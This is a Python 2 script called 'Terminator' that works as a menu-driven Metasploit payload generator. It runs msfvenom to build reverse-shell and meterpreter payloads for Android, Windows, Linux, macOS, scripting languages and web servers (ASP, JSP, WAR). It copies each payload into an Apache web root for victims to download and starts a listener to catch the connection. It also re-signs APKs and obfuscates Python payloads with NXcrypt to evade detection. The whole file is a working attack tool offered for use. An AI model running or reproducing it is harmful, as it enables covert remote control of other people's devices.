#Coded_By_Mohamed_Nour

import os
import sys
import urllib
##################################
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
G = '\033[92m' #green
Y = '\033[93m' #yellow
B = '\033[94m' #blue
R = '\033[91m' #red
W = '\033[0m' #white
##################################
####################  Banner  #######################

def banner():
    print ("""

%s
_________ _______  _______  _______ _________ _        _______ _________ _______  _______ 
\__   __/(  ____ \(  ____ )(       )\__   __/( (    /|(  ___  )\__   __/(  ___  )(  ____ )
   ) (   | (    \/| (    )|| () () |   ) (   |  \  ( || (   ) |   ) (   | (   ) || (    )|
   | |   | (__    | (____)|| || || |   | |   |   \ | || (___) |   | |   | |   | || (____)|
   | |   |  __)   |     __)| |(_)| |   | |   | (\ \) ||  ___  |   | |   | |   | ||     __)
   | |   | (      | (\ (   | |   | |   | |   | | \   || (   ) |   | |   | |   | || (\ (   
   | |   | (____/\| ) \ \__| )   ( |___) (___| )  \  || )   ( |   | |   | (___) || ) \ \__
   )_(   (_______/|/   \__/|/     \|\_______/|/    )_)|/     \|   )_(   (_______)|/   \__/
   %s

                        [+]    Metasploit Payload Generator     [+]
                        [+] Created By MohamedNour & SaberSebri [+]


%s
List payloads:

 1) Binaries Payloads
 2) Scripting Payloads
 3) Web Payloads
 4) Encrypters
 0) Exit
"""%(R,G,B))
    banner = raw_input(" Select from the menu : ")
    print("")

    if banner == "1":
	    bin()
    elif banner == "2":
	    script()
    elif banner == "3":
	    web()
    elif banner == "4":
	    enc()

    else:
        sys.exit();
####################  BANNER  #######################

def msf():
	print "Do You Want To Install it ? : "
	ch = raw_input()
	if ch in yes :
		os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")  
	else :
		print "OK BB !"
		sys.exit(0)


def clear():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
###############################
def bin():
	print("""
  1) Android
  2) Windows
  3) Linux
  4) Mac OS
  0) Back to menu
""")

	bn = raw_input("Set Payload: ")
	print("")
	if bn == "1":
		android()
	elif bn == "2":
		windows()
	elif bn == "3":
		linux()
	elif bn == "4":
		mac()
	else:
		banner()

def web():
	print("""
  1) ASP
  2) JSP
  3) War
  0) Back to menu

""")

	wb = raw_input("Set Payload: ")
	print("")
	if wb == "1":
		asp()
	elif wb == "2":
		jsp()
	elif wb == "3":
		war()
	else:
		banner()

def script():
	print("""
  1) Python
  2) Perl
  3) Bash
  0) Back to menu
  
""")

	sc = raw_input("Set Payload: ")
	print("")
	if sc == "1":
		python()
	elif sc == "2":
		perl()
	elif sc == "3":
		bash()
	else:
		banner()

def enc():
	print("""
  1) APK Encrypter
  2) Python Encrypter
  0) Back to menu

""")
        en = raw_input("Select Encrypter : ")
        print("")
        if en == "1":
                apkenc()
        elif en == "2":
                pyenc()
        else:
                banner()


def android():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.apk /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.apk"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def windows():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.exe /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.exe"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

def linux():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > %s.elf"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.elf /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.elf"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD linux/x86/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD linux/x86/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')


def mac():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > %s.macho"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.macho /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.macho"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD osx/x86/shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD osx/x86/shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')



def python():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > %s.py"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.py /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.py"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_python
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_python
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')


def perl():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > %s.pl"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.pl /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.pl"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_perl
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_perl
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')


def bash():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > %s.sh"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.sh /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.sh"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_bash
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD cmd/unix/reverse_bash
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def asp():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > %s.asp"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.asp /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.asp"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def jsp():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > %s.jsp"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.jsp /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.jsp"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')
def war():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > %s.war"%(lhost,lport,name))
	clear()
	print "Payload Successfuly Generated"
	print "[1]-Do You Want To Start a listenner"
	print "[2]-Do You Want To Start an IP Poisener "
	li = raw_input()
	if li == '2' :
		os.system('sudo service apache2 start')
		os.system('sudo cp %s.war /var/www/html'%(name))
		print "Your IP Successfully Poisened : %s/%s.war"%(lhost,name)
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

	else :
		listen = """
		use exploit/multi/handler
		set PAYLOAD java/jsp_shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost,lport)
		with open('listener.rc', 'w') as f :
			f.write(listen)
		os.system('msfconsole -r listener.rc')

def apkenc():
	filename = raw_input("Enter Your Payload Name (ex.apk) : ")
        os.system("keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000")
        os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore %s alias_name"%(filename))
        print("Your Payload Has Been Successfully Encrypted !")

def pyenc():
        check = raw_input("Is It Your First Time ? (y/N) :")
        pypayload = raw_input("Enter Your Python Payload Name (ex.py) : ")
        pyoutput = raw_input("Enter The Output Name of Your Payload : ") 
        if check in no:
            os.system("cd NXcrypt && sudo python NXcrypt.py -f ../%s -o ../%s"%(pypayload,pyoutput))
        else:
            os.system("git clone https://github.com/Hadi999/NXcrypt.git")
            os.system("cd NXcrypt && sudo python NXcrypt.py -f ../%s -o ../%s"%(pypayload,pyoutput))

####################  BEGIN  #######################
print("-----------------------------------------------")
print("Is Metasploit Installed In Your Machine ? (Y/N)")
print("-----------------------------------------------")

mscheck = raw_input("Answer: ")
if mscheck in no:
	msf()
elif mscheck in yes:
	banner()
else: 
	banner()
